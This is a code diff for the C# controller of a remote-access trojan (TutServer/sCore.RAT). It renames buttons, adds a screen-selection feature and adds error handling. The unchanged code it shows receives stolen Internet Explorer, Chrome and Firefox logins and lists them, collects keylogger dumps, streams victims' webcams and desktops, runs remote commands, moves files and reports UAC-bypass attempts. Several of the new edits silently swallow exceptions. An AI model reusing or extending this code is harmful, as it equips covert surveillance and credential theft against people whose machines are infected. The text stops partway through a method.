@@ -11,6 +11,7 @@ using System.IO;
 using System.Reflection;
 using sCore;
 using sCore.IO;
+using System.Threading.Tasks;
 
 namespace TutServer
 {
@@ -58,7 +59,7 @@ namespace TutServer
         public static int resx = 0;
         public static int resy = 0;
         public static int resdataav = 0;
-        private static bool _isrdFull = false;
+        public static bool _isrdFull = false;
         public static bool IsRdFull { get { return _isrdFull; } set { _isrdFull = value; sCore.RAT.RemoteDesktop.isFullScreen = value; } }
         private RDesktop Rdxref;
         public static List<Form> routeWindow = new List<Form>();
@@ -89,6 +90,9 @@ namespace TutServer
         LinuxClientManager lcm;
         List<remotePipe> rPipeList = new List<remotePipe>();
         ScriptHost sh;
+
+        private bool IsException = false; //switch
+        private bool mouseMovement = true; //switch
 
         public class LinuxClientManager
         {
@@ -552,7 +556,7 @@ namespace TutServer
         {
             if (!RDesktop)
             {
-                button21_Click(null, null);
+                btnStartRemoteScreen_Click(null, null);
             }
         }
 
@@ -564,7 +568,7 @@ namespace TutServer
                 return;
             }
 
-            button22_Click(null, null);
+            btnStopRemoteScreen_Click(null, null);
         }
 
         public void XControlRemoteMouse(bool state)
@@ -575,8 +579,8 @@ namespace TutServer
                 return;
             }
 
-            checkBox1.Checked = state;
-            checkBox1_CheckedChanged(null, null);
+            checkBoxrMouse.Checked = state;
+            checkBoxrMouse_CheckedChanged(null, null);
         }
 
         public void XControlRemoteKeyboard(bool state)
@@ -587,8 +591,8 @@ namespace TutServer
                 return;
             }
 
-            checkBox2.Checked = state;
-            checkBox2_CheckedChanged(null, null);
+            checkBoxrKeyboard.Checked = state;
+            checkBoxrKeyboard_CheckedChanged(null, null);
         }
 
         public void XLaunchFullScreen()
@@ -599,7 +603,7 @@ namespace TutServer
                 return;
             }
 
-            button23_Click(null, null);
+            btnFullRemoteScreen_Click(null, null);
         }
 
         public void XStartKeylogger()
@@ -950,9 +954,9 @@ namespace TutServer
             update.Start();
 
             Class1.test = "not test";
-            sh = new ScriptHost("scripts", this);
-            sh.LoadDllFiles();
-            sh.SetupBridge();
+            //sh = new ScriptHost("scripts", this);
+            //sh.LoadDllFiles();
+            //sh.SetupBridge();
         }
 
         private void updateValues(object sender, EventArgs e)
@@ -1035,7 +1039,7 @@ namespace TutServer
                 catch (Exception ex)
                 {
                     //Do nothing
-                    Console.WriteLine("Routed Window value update error");
+                    Console.WriteLine("Routed Window value update error  ERROR  =" + ex.Message);
                 }
             }
             List<String> tmp = new List<String>();
@@ -1212,10 +1216,10 @@ namespace TutServer
 
         private void addlvClientCallback(String clientid)
         {
-            if (this.InvokeRequired)
+            if (InvokeRequired)
             {
                 addlvClient k = new addlvClient(addlvClientCallback);
-                this.Invoke(k, new object[] { clientid } );
+                Invoke(k, new object[] { clientid } );
             }
             else
             {
@@ -1227,10 +1231,10 @@ namespace TutServer
 
         private void restartServer(int id)
         {
-            if (this.InvokeRequired)
+            if (InvokeRequired)
             {
                 restartServerCallback callback = new restartServerCallback(restartServer);
-                this.Invoke(callback, new object[] { id });
+                Invoke(callback, new object[] { id });
             }
             else
             {
@@ -1275,21 +1279,40 @@ namespace TutServer
 
         private void setImage(Bitmap image)
         {
-            if (this.InvokeRequired)
+            if (InvokeRequired)
             {
                 setImageCallback callback = new setImageCallback(setImage);
-                if (image != null) this.Invoke(callback, new object[] { image });
+                // if (image != null) this.Invoke(callback, new object[] { image });
+                if (image != null)
+                {
+                    try
+                    {
+                        Invoke(callback, new object[] { image });
+                    }
+                    catch //(Exception ex)
+                    {
+                        // MessageBox.Show("Connection Lost  ERROR Message = " + ex.Message);
+                    }
+                }
             }
             else
             {
                 if (!IsRdFull)
                 {
-                    if (image == null) Console.WriteLine("image is null");
-                    pictureBox1.Image = image;
+                   // if (image == null) Console.WriteLine("image is null");
+
+                    if (image != null) // added this as there was sometimes flashes of white screen very annoying
+                    {
+                        pictureBox1.Image = image;
+                    }
+
                 }
                 else
                 {
-                    Rdxref.image = image;
+                   if (image != null) // added this as there was sometimes flashes of white screen very annoying main screen
+                    {
+                        Rdxref.image = image;
+                    }
                 }
 
                 if (rdRouteUpdate != "route0.none")
@@ -1342,27 +1365,39 @@ namespace TutServer
             }
         }
 
-//Receive Callback (when client sends back data to server)
-
+        //Receive Callback (when client sends back data to server)
+       
+        private string text = string.Empty;
+        private int received;
 
         private void ReceiveCallback(IAsyncResult AR)
         {
             Socket current = (Socket)AR.AsyncState;
-            int received;
+          
             bool dclient = false;
 
             if (!IsStartedServer) return;
 
             try
             {
-                received = current.EndReceive(AR);
+                if(IsException == false)
+                {
+                    received = current.EndReceive(AR);
+                }
+                if (IsException == true)
+                {
+                   received = current.EndReceive(AR); //get the jibberish and reset it back to 0
+                   received = 0;
+                    IsException = false;
+                }
+               
             }
             catch (Exception)
             {
                 int id = getSocket(current);
                 reScanTarget = true;
                 reScanStart = id;
-                Console.WriteLine("Client forcefully disconnected");
+               // Console.WriteLine("Client forcefully disconnected");
                 current.Close(); // Dont shutdown because the socket may be disposed and its disconnected anyway
                 _clientSockets.Remove(current);
                 restartServer(id);
@@ -1376,15 +1411,17 @@ namespace TutServer
 
             if (MultiRecv)
             {
-                String header = Encoding.Unicode.GetString(recBuf, 0, 8 * 2);
+                try
+                {
+                  String header = Encoding.Unicode.GetString(recBuf, 0, 8 * 2);
                 //Console.WriteLine("Header: " + header + "\nSize: " + recBuf.Length.ToString());
                 if (header == "rdstream")
                 {
-                    using (System.IO.MemoryStream stream = new System.IO.MemoryStream())
+                    using (MemoryStream stream = new MemoryStream())
                     {
                         stream.Write(recBuf, 8 * 2, recBuf.Length - 8 * 2);
                         //Console.WriteLine("multiRecv Length: " + recBuf.Length);
-                        System.Drawing.Bitmap deskimage = (System.Drawing.Bitmap) System.Drawing.Bitmap.FromStream(stream);
+                        Bitmap deskimage = (Bitmap)Image.FromStream(stream);
                         if (resdataav == 0)
                         {
                             resx = deskimage.Width;
@@ -1397,6 +1434,10 @@ namespace TutServer
                         //Console.Title = "Received image!!";
                         Array.Clear(recBuf, 0, received);
                         ignoreFlag = true;
+
+                        GC.Collect(); //-added to cleanup resources
+                        GC.WaitForPendingFinalizers();
+                        System.Threading.Thread.SpinWait(5000);
                     }
                 }
 
@@ -1411,12 +1452,12 @@ namespace TutServer
 
                 if (header == "wcstream")
                 {
-                    System.IO.MemoryStream stream = new System.IO.MemoryStream();
+                    MemoryStream stream = new MemoryStream();
 
                     stream.Write(recBuf, 8 * 2, recBuf.Length - 8 * 2);
                     Console.WriteLine("multiRecv Length: " + recBuf.Length);
 
-                    System.Drawing.Bitmap camimage = (System.Drawing.Bitmap)System.Drawing.Bitmap.FromStream(stream);
+                    Bitmap camimage = (Bitmap)Image.FromStream(stream);
 
                     stream.Flush();
                     stream.Close();
@@ -1425,6 +1466,12 @@ namespace TutServer
                     setWebCam(camimage);
                     Array.Clear(recBuf, 0, received);
                     ignoreFlag = true;
+                   }
+                 }
+                catch(Exception )
+                {
+                   
+                   //  MessageBox.Show("Someone tried to access this server without the proper credentials :: Original ERROR : " + ex.Message, "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                 }
             }
 
@@ -1457,8 +1504,18 @@ namespace TutServer
                 obj.s = current;
 
                 clThread.Start(obj);
-                string text = Encoding.Unicode.GetString(recBuf);
-                text = Decrypt(text);
+                try  //added this as sometimes it cannot decryt the text and lots of ascii art appears on my picturebox along with a hugh memory exception
+                {
+
+                    text = Encoding.Unicode.GetString(recBuf);
+                    text = Decrypt(text);
+
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Original Error :: " + ex.Message);
+                }
+
 
                 if (lcm != null)
                 {
@@ -1468,337 +1525,355 @@ namespace TutServer
                         text = Encoding.ASCII.GetString(recBuf);
                     }
                 }
-
-                if (text.StartsWith("infoback;"))
+                if (text != null)//---------------------put this here as sometimes it cannot be decryted and returns null
                 {
-                    int id = int.Parse(text.Split(';')[1]);
-                    String data = text.Split(';')[2];
-                    String[] lines = data.Split('|');
-                    //MessageBox.Show(data);
-                    String name = lines[0];
-                    String ip = lines[1];
-                    String time = lines[2];
-                    String av = lines[3];
 
-                    setlvClientInfoCallback(name, ip, time, av, id);
-                }
-
-                if (text.StartsWith("setproc|"))
-                {
-                    foreach (String line in text.Split('\n'))
+                    if (text.StartsWith("infoback;")) //very big exception thrown here ???
                     {
-                        if (line == "") continue;
+                        int id = int.Parse(text.Split(';')[1]);
+                        String data = text.Split(';')[2];
+                        String[] lines = data.Split('|');
+                        //MessageBox.Show(data);
+                        String name = lines[0];
+                        String ip = lines[1];
+                        String time = lines[2];
+                        String av = lines[3];
 
-                        String name = line.Split('|')[1];
-                        String responding = line.Split('|')[2];
-                        String title = line.Split('|')[3];
-                        String priority = line.Split('|')[4];
-                        String path = line.Split('|')[5];
-                        String id = line.Split('|')[6];
-
-                        setprocInfoCallback(name, responding, title, priority, path, id);
+                        setlvClientInfoCallback(name, ip, time, av, id);
                     }
 
-                    SortList(listView2);
-                }
-
-                if (text.StartsWith("cmdout§"))
-                {
-                    //MessageBox.Show("test");
-                    String output = text.Split('§')[1];
-                    output = output.Replace("cmdout", String.Empty);
-                    append(output);
-                }
-
-                if (text.StartsWith("fdrivel§"))
-                {
-                    String data = text.Split('§')[1];
-
-                    lvClear(listView3);
-
-                    foreach (String drive in data.Split('\n'))
+                    if (text.StartsWith("ScreenCount")) //get screen count result back from the client 
                     {
-                        if (!drive.Contains("|")) continue;
-                        String name = drive.Split('|')[0];
-                        String size = convert(drive.Split('|')[1]);
+                        string screens = string.Empty;
 
-                        addFileCallback(name, size, "N/A", name);
+                        screens = text.Replace("ScreenCount", "").Replace(" ", "");
+
+                        foreach (char screen in screens)
+                        {
+                            setClientScreenCountCallBack(screen); //async call back                   
+                        }
+
                     }
-                }
 
-                if (text.StartsWith("fdirl"))
-                {
-                    String data = text.Substring(5);
-                    String[] entries = data.Split('\n');
-
-                    foreach (String entry in entries)
+                    if (text.StartsWith("setproc|"))
                     {
-                        if (entry == "") continue;
-                        String name = entry.Split('§')[0];
-                        String size = convert(entry.Split('§')[1]);
-                        String crtime = entry.Split('§')[2];
-                        String path = entry.Split('§')[3];
-                        //Console.WriteLine(entry.Split('§')[1]);
-                        addFileCallback(name, size, crtime, path);
+                        foreach (String line in text.Split('\n'))
+                        {
+                            if (line == "") continue;
+
+                            String name = line.Split('|')[1];
+                            String responding = line.Split('|')[2];
+                            String title = line.Split('|')[3];
+                            String priority = line.Split('|')[4];
+                            String path = line.Split('|')[5];
+                            String id = line.Split('|')[6];
+
+                            setprocInfoCallback(name, responding, title, priority, path, id);
+                        }
+
+                        SortList(listView2);
                     }
-                }
 
-                if (text.StartsWith("backfile§"))
-                {
-                    String content = text.Split('§')[1];
-                    startEditor(content, me);
-                }
-
-                if (text == "fconfirm")
-                {
-                    Byte[] databyte = File.ReadAllBytes(fup_local_path);
-                    loopSendByte(databyte);
-                }
-
-                if (text == "frecv")
-                {
-                    msgbox("File Upload", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                    uploadFinished = true;
-                }
-
-                if (text.StartsWith("finfo§"))
-                {
-                    int size = int.Parse(text.Split('§')[1]);
-                    fdl_size = size;
-                    recvFile = new byte[fdl_size];
-                    isFileDownload = true;
-                    loopSend("fconfirm");
-                }
-
-                if (text.StartsWith("f1§"))
-                {
-                    String dir = text.Split('§')[1];
-
-                    if (dir != "drive") parent(dir);
-                    if (dir == "drive")
+                    if (text.StartsWith("cmdout§"))
                     {
-                        Current_Path = "drive";
-                        loopSend("fdrive");
+                        //MessageBox.Show("test");
+                        String output = text.Split('§')[1];
+                        output = output.Replace("cmdout", String.Empty);
+                        append(output);
+                    }
+
+                    if (text.StartsWith("fdrivel§"))
+                    {
+                        String data = text.Split('§')[1];
+
                         lvClear(listView3);
-                    }
-                }
 
-                if (text.StartsWith("putklog"))
-                {
-                    String dump = text.Substring(7);
-                    setLog(dump);
-                }
-
-                if (text.StartsWith("dclient"))
-                {
-                    Console.WriteLine("Client Disconnected");
-                    dclient = true;
-                    switchTab(tabPage1);
-                    killtarget = getSocket(current);
-                    killSocket = current;
-                    if (controlClients[0] == killtarget)
-                    {
-                        //TODO: write UI reset code
-                        remotePipe[] rpArray = { null };
-                        sCore.RAT.ExternalApps.ipcConnections.Clear();
-                        Array.Copy(rPipeList.ToArray(), rpArray, rPipeList.Count);
-                        foreach (remotePipe rp in rpArray)
+                        foreach (String drive in data.Split('\n'))
                         {
-                            if (rp == null) continue;
-                            rp.RemoteRemove = false;
-                            ClosePipe(rp);
-                        }
-                        
-                        rPipeList.Clear();
-                    }
-                    int id = killtarget;
-                    reScanTarget = true;
-                    reScanStart = id;
-                    if (lcm != null)
-                    {
-                        if (lcm.IsLinuxClient(id)) lcm.RemoveAssociation(id);
-                    }
-                    Console.WriteLine("Timer Removed Client");
-                    killSocket.Close(); // Dont shutdown because the socket may be disposed and its disconnected anyway
-                    _clientSockets.Remove(killSocket);
-                    restartServer(id);
-                }
+                            if (!drive.Contains("|")) continue;
+                            String name = drive.Split('|')[0];
+                            String size = convert(drive.Split('|')[1]);
 
-                if (text.StartsWith("alist"))
-                {
-                    lvClear(listView4);
-                    String data = text.Substring(5);
-                    int devices = 0;
-                    foreach (String device in data.Split('§'))
-                    {
-                        String name = device.Split('|')[0];
-                        String channel = device.Split('|')[1];
-                        addAudio(name, channel);
-                        devices++;
-                    }
-                    if (devices == 0)
-                    {
-                        msgbox("Warning", "No audio capture devices present on this target", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                    }
-                }
-
-                if (text.StartsWith("wlist"))
-                {
-                    lvClear(listView5);
-                    String data = text.Substring(5);
-                    int devices = 0;
-                    foreach (String device in data.Split('§'))
-                    {
-                        if (device == "") continue;
-                        String id = device.Split('|')[0];
-                        String name = device.Split('|')[1];
-                        addCam(id, name);
-                        devices++;
-                    }
-
-                    if (devices == 0)
-                    {
-                        msgbox("Warning", "No video capture devices present on this target!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                    }
-                }
-
-                if (text.StartsWith("setstart§"))
-                {
-                    String sap = text.Split('§')[1];
-                    remStart = sap;
-                }
-
-                if (text == "getpwu")
-                {
-                    System.Threading.Thread notify = new System.Threading.Thread(new System.Threading.ThreadStart(pwuNotification));
-                    notify.Start();
-                }
-
-                if (text.StartsWith("iepw"))
-                {
-                    String[] ieLogins = text.Split('\n');
-                    if (ieLogins[1] == "failed")
-                    {
-                        Console.WriteLine("no ie logins");
-                    }
-                    else
-                    {
-                        List<String> ielogin = ieLogins.ToList<String>();
-                        ielogin.RemoveAt(0);
-                        ieLogins = ielogin.ToArray();
-
-                        foreach (String login in ieLogins)
-                        {
-                            String[] src = login.Split('§');
-                            String user = src[0];
-                            String password = src[1];
-                            String url = src[2];
-                            ListViewItem lvi = new ListViewItem();
-                            lvi.Text = url;
-                            lvi.SubItems.Add(user);
-                            lvi.SubItems.Add(password);
-                            lvAddItem(listView6, lvi, 1); // 1 = group Internet Explorer
+                            addFileCallback(name, size, "N/A", name);
                         }
                     }
-                }
 
-                if (text.StartsWith("gcpw"))
-                {
-                    String[] gcLogins = text.Split('\n');
-                    if (gcLogins[1] == "failed")
+                    if (text.StartsWith("fdirl"))
                     {
-                        Console.WriteLine("no gc logins");
-                    }
-                    else
-                    {
-                        List<String> gclogin = gcLogins.ToList<String>();
-                        gclogin.RemoveAt(0);
-                        gcLogins = gclogin.ToArray();
+                        String data = text.Substring(5);
+                        String[] entries = data.Split('\n');
 
-                        foreach (String login in gcLogins)
+                        foreach (String entry in entries)
                         {
-                            String[] src = login.Split('§');
-                            String user = src[1];
-                            String password = src[2];
-                            String url = src[0];
-                            ListViewItem lvi = new ListViewItem();
-                            lvi.Text = url;
-                            lvi.SubItems.Add(user);
-                            lvi.SubItems.Add(password);
-                            lvAddItem(listView6, lvi, 0); // 0 = group Google Chrome
+                            if (entry == "") continue;
+                            String name = entry.Split('§')[0];
+                            String size = convert(entry.Split('§')[1]);
+                            String crtime = entry.Split('§')[2];
+                            String path = entry.Split('§')[3];
+                            //Console.WriteLine(entry.Split('§')[1]);
+                            addFileCallback(name, size, crtime, path);
                         }
                     }
-                }
 
-                if (text.StartsWith("ffpw"))
-                {
-                    String[] ffLogins = text.Split('\n');
-                    if (ffLogins[1] == "failed")
+                    if (text.StartsWith("backfile§"))
                     {
-                        Console.WriteLine("no ff logins");
+                        String content = text.Split('§')[1];
+                        startEditor(content, me);
                     }
-                    else
-                    {
-                        List<String> fflogin = ffLogins.ToList<String>();
-                        fflogin.RemoveAt(0);
-                        ffLogins = fflogin.ToArray();
 
-                        foreach (String login in ffLogins)
+                    if (text == "fconfirm")
+                    {
+                        Byte[] databyte = File.ReadAllBytes(fup_local_path);
+                        loopSendByte(databyte);
+                    }
+
+                    if (text == "frecv")
+                    {
+                        msgbox("File Upload", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        uploadFinished = true;
+                    }
+
+                    if (text.StartsWith("finfo§"))
+                    {
+                        int size = int.Parse(text.Split('§')[1]);
+                        fdl_size = size;
+                        recvFile = new byte[fdl_size];
+                        isFileDownload = true;
+                        loopSend("fconfirm");
+                    }
+
+                    if (text.StartsWith("f1§"))
+                    {
+                        String dir = text.Split('§')[1];
+
+                        if (dir != "drive") parent(dir);
+                        if (dir == "drive")
                         {
-                            String[] src = login.Split('§');
-                            String user = src[2];
-                            String password = src[3];
-                            String url = src[1];
-                            ListViewItem lvi = new ListViewItem();
-                            lvi.Text = url;
-                            lvi.SubItems.Add(user);
-                            lvi.SubItems.Add(password);
-                            lvAddItem(listView6, lvi, 2); // 2 = group Firefox
+                            Current_Path = "drive";
+                            loopSend("fdrive");
+                            lvClear(listView3);
                         }
                     }
-                }
 
-                if (text.StartsWith("error"))
-                {
-                    String code = text.Split('§')[1];
-                    String title = text.Split('§')[2];
-                    String message = text.Split('§')[3];
-                    label24.ForeColor = Color.Gold;
-                    label24.BackColor = Color.Black;
-                    SetErrorText("Error " + code + "\n" + title + "\n" + message);
-                    ShowError();
-                    Timer t = new Timer();
-                    t.Interval = 10000;
-                    t.Tick += new EventHandler(dismissUpdate);
-                    t.Start();
-                    if (title == "UAC Bypass")
+                    if (text.StartsWith("putklog"))
                     {
-                        msgbox("UAC Bypass Failed", "Please upload the core files to the directory the client is located in\r\n(" + remStart + ")", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        String dump = text.Substring(7);
+                        setLog(dump);
                     }
 
-                    Types.ClientErrorMessage eMsg = new Types.ClientErrorMessage(code, message, title);
-                    
-                    sCore.RAT.ServerSettings.RaiseErrorEvent(eMsg);
-                }
-
-                if (text.StartsWith("ipc§"))
-                {
-                    string serverName = text.Split('§')[1];
-                    string message = text.Substring(text.IndexOf('§') + 1);
-                    message = message.Substring(message.IndexOf('§') + 1);
-
-                    foreach (remotePipe rp in rPipeList)
+                    if (text.StartsWith("dclient"))
                     {
-                        if (rp.pname == serverName)
+                        Console.WriteLine("Client Disconnected");
+                        dclient = true;
+                        switchTab(tabPage1);
+                        killtarget = getSocket(current);
+                        killSocket = current;
+                        if (controlClients[0] == killtarget)
                         {
-                            rp.WriteOutput(message);
-                            break;
+                            //TODO: write UI reset code
+                            remotePipe[] rpArray = { null };
+                            sCore.RAT.ExternalApps.ipcConnections.Clear();
+                            Array.Copy(rPipeList.ToArray(), rpArray, rPipeList.Count);
+                            foreach (remotePipe rp in rpArray)
+                            {
+                                if (rp == null) continue;
+                                rp.RemoteRemove = false;
+                                ClosePipe(rp);
+                            }
+
+                            rPipeList.Clear();
+                        }
+                        int id = killtarget;
+                        reScanTarget = true;
+                        reScanStart = id;
+                        if (lcm != null)
+                        {
+                            if (lcm.IsLinuxClient(id)) lcm.RemoveAssociation(id);
+                        }
+                        Console.WriteLine("Timer Removed Client");
+                        killSocket.Close(); // Dont shutdown because the socket may be disposed and its disconnected anyway
+                        _clientSockets.Remove(killSocket);
+                        restartServer(id);
+                    }
+
+                    if (text.StartsWith("alist"))
+                    {
+                        lvClear(listView4);
+                        String data = text.Substring(5);
+                        int devices = 0;
+                        foreach (String device in data.Split('§'))
+                        {
+                            String name = device.Split('|')[0];
+                            String channel = device.Split('|')[1];
+                            addAudio(name, channel);
+                            devices++;
+                        }
+                        if (devices == 0)
+                        {
+                            msgbox("Warning", "No audio capture devices present on this target", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                         }
                     }
+
+                    if (text.StartsWith("wlist"))
+                    {
+                        lvClear(listView5);
+                        String data = text.Substring(5);
+                        int devices = 0;
+                        foreach (String device in data.Split('§'))
+                        {
+                            if (device == "") continue;
+                            String id = device.Split('|')[0];
+                            String name = device.Split('|')[1];
+                            addCam(id, name);
+                            devices++;
+                        }
+
+                        if (devices == 0)
+                        {
+                            msgbox("Warning", "No video capture devices present on this target!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        }
+                    }
+
+                    if (text.StartsWith("setstart§"))
+                    {
+                        String sap = text.Split('§')[1];
+                        remStart = sap;
+                    }
+
+                    if (text == "getpwu")
+                    {
+                        System.Threading.Thread notify = new System.Threading.Thread(new System.Threading.ThreadStart(pwuNotification));
+                        notify.Start();
+                    }
+
+                    if (text.StartsWith("iepw"))
+                    {
+                        String[] ieLogins = text.Split('\n');
+                        if (ieLogins[1] == "failed")
+                        {
+                            Console.WriteLine("no ie logins");
+                        }
+                        else
+                        {
+                            List<String> ielogin = ieLogins.ToList<String>();
+                            ielogin.RemoveAt(0);
+                            ieLogins = ielogin.ToArray();
+
+                            foreach (String login in ieLogins)
+                            {
+                                String[] src = login.Split('§');
+                                String user = src[0];
+                                String password = src[1];
+                                String url = src[2];
+                                ListViewItem lvi = new ListViewItem();
+                                lvi.Text = url;
+                                lvi.SubItems.Add(user);
+                                lvi.SubItems.Add(password);
+                                lvAddItem(listView6, lvi, 1); // 1 = group Internet Explorer
+                            }
+                        }
+                    }
+
+                    if (text.StartsWith("gcpw"))
+                    {
+                        String[] gcLogins = text.Split('\n');
+                        if (gcLogins[1] == "failed")
+                        {
+                            Console.WriteLine("no gc logins");
+                        }
+                        else
+                        {
+                            List<String> gclogin = gcLogins.ToList<String>();
+                            gclogin.RemoveAt(0);
+                            gcLogins = gclogin.ToArray();
+
+                            foreach (String login in gcLogins)
+                            {
+                                String[] src = login.Split('§');
+                                String user = src[1];
+                                String password = src[2];
+                                String url = src[0];
+                                ListViewItem lvi = new ListViewItem();
+                                lvi.Text = url;
+                                lvi.SubItems.Add(user);
+                                lvi.SubItems.Add(password);
+                                lvAddItem(listView6, lvi, 0); // 0 = group Google Chrome
+                            }
+                        }
+                    }
+
+                    if (text.StartsWith("ffpw"))
+                    {
+                        String[] ffLogins = text.Split('\n');
+                        if (ffLogins[1] == "failed")
+                        {
+                            Console.WriteLine("no ff logins");
+                        }
+                        else
+                        {
+                            List<String> fflogin = ffLogins.ToList<String>();
+                            fflogin.RemoveAt(0);
+                            ffLogins = fflogin.ToArray();
+
+                            foreach (String login in ffLogins)
+                            {
+                                String[] src = login.Split('§');
+                                String user = src[2];
+                                String password = src[3];
+                                String url = src[1];
+                                ListViewItem lvi = new ListViewItem();
+                                lvi.Text = url;
+                                lvi.SubItems.Add(user);
+                                lvi.SubItems.Add(password);
+                                lvAddItem(listView6, lvi, 2); // 2 = group Firefox
+                            }
+                        }
+                    }
+
+                    if (text.StartsWith("error"))
+                    {
+                        String code = text.Split('§')[1];
+                        String title = text.Split('§')[2];
+                        String message = text.Split('§')[3];
+                        label24.ForeColor = Color.Gold;
+                        label24.BackColor = Color.Black;
+                        SetErrorText("Error " + code + "\n" + title + "\n" + message);
+                        ShowError();
+                        Timer t = new Timer();
+                        t.Interval = 10000;
+                        t.Tick += new EventHandler(dismissUpdate);
+                        t.Start();
+                        if (title == "UAC Bypass")
+                        {
+                            msgbox("UAC Bypass Failed", "Please upload the core files to the directory the client is located in\r\n(" + remStart + ")", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        }
+
+                        Types.ClientErrorMessage eMsg = new Types.ClientErrorMessage(code, message, title);
+
+                        sCore.RAT.ServerSettings.RaiseErrorEvent(eMsg);
+                    }
+
+                    if (text.StartsWith("ipc§"))
+                    {
+                        string serverName = text.Split('§')[1];
+                        string message = text.Substring(text.IndexOf('§') + 1);
+                        message = message.Substring(message.IndexOf('§') + 1);
+
+                        foreach (remotePipe rp in rPipeList)
+                        {
+                            if (rp.pname == serverName)
+                            {
+                                rp.WriteOutput(message);
+                                break;
+                            }
+                        }
+                    }
+
                 }
             }
+           
 
-		    if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current);
+            if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current);
 
 	    }
 
@@ -2099,10 +2174,10 @@ namespace TutServer
                 String final = value + " " + stackName;
                 return final;
             }
-            catch (Exception e)
+            catch (Exception )
             {
                 //Console.WriteLine(e);
-                Console.WriteLine("files, converter error");
+               // Console.WriteLine("files, converter error");
                 return "ERROR";
             }
         }
@@ -2185,6 +2260,25 @@ namespace TutServer
                 client.SubItems.Add(av);
             }
         }
+        private delegate void setScreenCount(char screenCount); //this is the method for updating the choose screen combobox
+
+        private void setClientScreenCountCallBack(char screenCount)
+        {
+
+            if (InvokeRequired)
+            {
+
+                setScreenCount callBack = new setScreenCount(setClientScreenCountCallBack);
+                Invoke(callBack, new object[] { screenCount });
+
+            }
+            else
+            {
+
+                cmboChooseScreen.Items.Add(screenCount);
+
+            }
+        }
 
         private void button1_Click(object sender, EventArgs e)
         {
@@ -2255,7 +2349,7 @@ namespace TutServer
             return clearText;
         }
 
-        public string Decrypt(string cipherText)
+        public string Decrypt(string cipherText) //this locked up???
         {
             try
             {
@@ -2278,11 +2372,13 @@ namespace TutServer
             }
             return cipherText;
             }
-            catch (Exception)
+            catch (Exception )
             {
                 //plain text?
-                Console.WriteLine("Decrypt error " + cipherText);
-                return cipherText;
+              //  MessageBox.Show("Decrypt error "); //dont show the decrytp error it is too large and causes more problems
+                //return  cipherText;
+                IsException = true; //spirals out of control here if you cannot decrypt jibberish over bad connection so added this - seems to work
+                return null;
             }
         }
 
@@ -2306,41 +2402,47 @@ namespace TutServer
 
         private void sendCommand(String command, int targetClient)
         {
-
-            Socket s = _clientSockets[targetClient];
-
-            if (lcm.IsLinuxClient(s))
-            {
-                lcm.SendCommand(command, targetClient);
-                return;
-            }
-
             try
             {
-                String k = command;
+                Socket s = _clientSockets[targetClient];
 
-                String crypted = Encrypt(k);
-                byte[] data = Encoding.Unicode.GetBytes(crypted);
-                String header = crypted.Length.ToString() + "§";
-                byte[] byteHeader = Encoding.Unicode.GetBytes(header);
-                byte[] fullBytes = new byte[byteHeader.Length + data.Length];
-                Array.Copy(byteHeader, fullBytes, byteHeader.Length);
-                Array.ConstrainedCopy(data, 0, fullBytes, byteHeader.Length, data.Length);
-                s.Send(fullBytes);
+                if (lcm.IsLinuxClient(s))
+                {
+                    lcm.SendCommand(command, targetClient);
+                    return;
+                }
+
+                try
+                {
+                    String k = command;
+
+                    String crypted = Encrypt(k);
+                    byte[] data = Encoding.Unicode.GetBytes(crypted);
+                    String header = crypted.Length.ToString() + "§";
+                    byte[] byteHeader = Encoding.Unicode.GetBytes(header);
+                    byte[] fullBytes = new byte[byteHeader.Length + data.Length];
+                    Array.Copy(byteHeader, fullBytes, byteHeader.Length);
+                    Array.ConstrainedCopy(data, 0, fullBytes, byteHeader.Length, data.Length);
+                    s.Send(fullBytes);
+                }
+                catch (Exception)
+                {
+                    int id = targetClient;
+                    reScanTarget = true;
+                    reScanStart = id;
+                    Console.WriteLine("Client forcefully disconnected");
+                    s.Close(); // Dont shutdown because the socket may be disposed and its disconnected anyway
+                    _clientSockets.Remove(s);
+                    switchTab(tabControl1.TabPages[0]);
+                    restartServer(id);
+                    return;
+                }
+
             }
-            catch (Exception)
+            catch
             {
-                int id = targetClient;
-                reScanTarget = true;
-                reScanStart = id;
-                Console.WriteLine("Client forcefully disconnected");
-                s.Close(); // Dont shutdown because the socket may be disposed and its disconnected anyway
-                _clientSockets.Remove(s);
-                switchTab(tabControl1.TabPages[0]);
-                restartServer(id);
-                return;
+
             }
-            
         }
 
         private void button3_Click(object sender, EventArgs e)
@@ -2603,13 +2705,16 @@ namespace TutServer
 
         private void button14_Click(object sender, EventArgs e)
         {
-            String cmd = "procstart|" + textBox4.Text + "|" + comboBox4.SelectedItem.ToString();
+            if (textBox4.Text != "")
+            {
+                String cmd = "procstart|" + textBox4.Text + "|" + comboBox4.SelectedItem.ToString();
 
-            loopSend(cmd);
-            textBox4.Clear();
-            System.Threading.Thread.Sleep(1000);
-            listView2.Items.Clear();
-            loopSend("proclist");
+                loopSend(cmd);
+                textBox4.Clear();
+                System.Threading.Thread.Sleep(1000);
+                listView2.Items.Clear();
+                loopSend("proclist");
+            }
         }
 
         private void button15_Click(object sender, EventArgs e)
@@ -2990,24 +3095,61 @@ namespace TutServer
             loopSend("cklog");
         }
 
-        private void button21_Click(object sender, EventArgs e)
+        private void btnStartRemoteScreen_Click(object sender, EventArgs e)
         {
+            btnCountScreens.Enabled = false;
+            cmboChooseScreen.Enabled = false;
+            btnStartTaskManager.Enabled = true;
+            btnFullScreenMode.Enabled = true;
+            trackBar1.Enabled = false;
+
+            if (cmboChooseScreen.SelectedItem != null)
+            {
+                loopSend("screenNum" + cmboChooseScreen.SelectedItem.ToString());
+            }
+            System.Threading.Thread.Sleep(1500);
+           // _multiRecv = true;
             MultiRecv = true;
-            RDesktop = true;
+           // _rdesktop = true;
             loopSend("rdstart");
+
         }
 
-        private void button22_Click(object sender, EventArgs e)
+        private void btnStopRemoteScreen_Click(object sender, EventArgs e)
         {
